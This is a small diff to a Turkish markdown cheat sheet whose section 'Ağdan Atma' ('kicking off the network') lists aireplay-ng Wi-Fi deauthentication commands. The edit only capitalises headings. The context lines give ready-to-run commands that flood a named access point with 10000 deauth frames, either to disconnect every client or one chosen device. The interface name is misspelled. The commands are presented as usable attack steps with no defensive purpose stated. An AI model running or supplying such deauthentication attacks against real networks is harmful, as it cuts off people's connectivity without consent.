@@ -7,10 +7,10 @@
 
 ## Ağdan Atma
 
---Tüm cihazları ağdan atma--
+--Tüm Cihazları Ağdan Atma--
 
 ~aireplay-ng --deauth 10000 -a E4:C3:2A:B7:23:90 wlam0mon
 
---Belirli cihazları ağdan atma--
+--Belirli Cihazları Ağdan Atma--
 
 ~aireplay-ng --deauth 10000 -a E4:C3:2A:B7:23:90 -c {atmak istediğimiz ağın mac adresi} wlam0mon
